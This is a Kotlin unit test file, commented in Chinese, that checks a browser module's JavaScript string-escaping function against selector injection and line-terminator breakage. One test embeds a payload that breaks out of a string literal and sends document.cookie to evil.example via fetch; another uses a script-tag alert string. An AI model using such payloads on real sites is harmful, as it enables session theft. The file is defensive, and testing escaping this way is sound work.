package com.ake.browser

import com.google.common.truth.Truth.assertThat
import com.google.common.truth.Truth.assertWithMessage
import org.junit.Test

// ===========================================================================
// P1 · `String.js()`：本模块唯一一处「越权即安全问题」的地方
//
// `Js.kt` 的文件头写得很重：抽出脚本里到处都要把 selector 拼进 JS，
// **漏掉一个反斜杠，轻则该选择器静默失配（表现为「点了没反应」），
// 重则构造出可执行的注入片段。**
// 这是纯字符串变换，属于「不测就说不过去」的那类。
// ===========================================================================

class JsEscapeTest {

    @Test
    fun plainStringIsQuotedOnce() {
        assertThat("add-to-cart".js()).isEqualTo("'add-to-cart'")
        assertThat("".js()).isEqualTo("''")
    }

    @Test
    fun singleQuoteIsEscaped() {
        assertThat("it's".js()).isEqualTo("'it\\'s'")
    }

    @Test
    fun backslashIsEscapedBeforeQuote() {
        // 顺序必须是「先反斜杠再引号」：反过来实现会得到 `\\'`
        // —— 反斜杠被吃掉一半，引号逃出字符串。
        assertThat("a\\b".js()).isEqualTo("'a\\\\b'")
        assertThat("\\'".js()).isEqualTo("'\\\\\\''")
    }

    @Test
    fun newlineIsNeutralised() {
        assertThat("a\nb".js()).isEqualTo("'a\\nb'")
    }

    @Test
    fun selectorInjectionCannotBreakOutOfTheStringLiteral() {
        val evil = "x'; fetch('http://evil.example?c=' + document.cookie); //"
        val escaped = evil.js()
        assertThat(escaped).startsWith("'")
        assertThat(escaped).endsWith("'")

        val inner = escaped.removePrefix("'").removeSuffix("'")
        // ★ 判据不是「看不见引号」而是「每一个引号都被反斜杠顶住」：
        //   这样 JS 那边读出来的一定还是原来那个字符串，而不是被截断后剩下的可执行片段。
        assertThat(UNESCAPED_QUOTE.findAll(inner).count()).isEqualTo(0)
        assertThat(inner).contains("fetch(\\'http://evil.example?c=\\' + document.cookie); //")
    }

    @Test
    fun carriageReturnAndLineSeparatorsAreEscaped() {
        // ⚠（原失败）修复前只转义了 `\n`。`\r`、U+2028 / U+2029 在 JS 里同样是
        //   **行终止符**，而单引号字符串字面量里不允许出现行终止符
        //   ⇒ 拼出的注入脚本是**语法错误**，整段一行都跑不了
        //   ⇒ bridge 超时 ⇒ 空观察，且看不出和「页面是空的」有什么区别。
        //   selector 是从页面上反推出来的，属性值里出现 CR / U+2028 不是不可能，而是「迟早」。
        assertThat("a\rb".js()).isEqualTo("'a\\rb'")
        assertThat("a\u2028b".js()).isEqualTo("'a\\u2028b'")
        assertThat("a\u2029b".js()).isEqualTo("'a\\u2029b'")

        // ★ 判据是「字面量里不含任何行终止符」，而不是「转义后不等于原串」
        for (raw in listOf("a\rb", "a\u2028b", "a\u2029b", "a\nb")) {
            val literal = raw.js()
            assertWithMessage("bad=$raw").that(literal).doesNotContain("\r")
            assertWithMessage("bad=$raw").that(literal).doesNotContain("\u2028")
            assertWithMessage("bad=$raw").that(literal).doesNotContain("\u2029")
            assertWithMessage("bad=$raw").that(literal).doesNotContain("\n")
        }
    }

    @Test
    fun everyJsLineTerminatorIsNeutralised() {
        // 兜底：把四个行终止符同时塞进一个 selector，转义后仍是一条合法的单行字面量
        val evil = "a\nb\rc\u2028d\u2029e'\\"
        val escaped = evil.js()
        assertThat(escaped).startsWith("'")
        assertThat(escaped).endsWith("'")
        val inner = escaped.removePrefix("'").removeSuffix("'")
        assertThat(UNESCAPED_QUOTE.findAll(inner).count()).isEqualTo(0)
        for (lt in listOf("\n", "\r", "\u2028", "\u2029")) {
            assertWithMessage("行终止符未中和").that(inner).doesNotContain(lt)
        }
    }

    @Test
    fun unicodeAndHtmlishTextPassThrough() {
        assertThat("</script><script>alert(1)</script>".js()).endsWith("</script>'")
        assertThat("中文日报に行く".js()).isEqualTo("'中文日报に行く'")
    }

    private companion object {
        /** 前面没有反斜杠的单引号 —— 一旦出现就意味着字面量被提前闭合。 */
        val UNESCAPED_QUOTE = Regex("""(?<!\\)'""")
    }
}
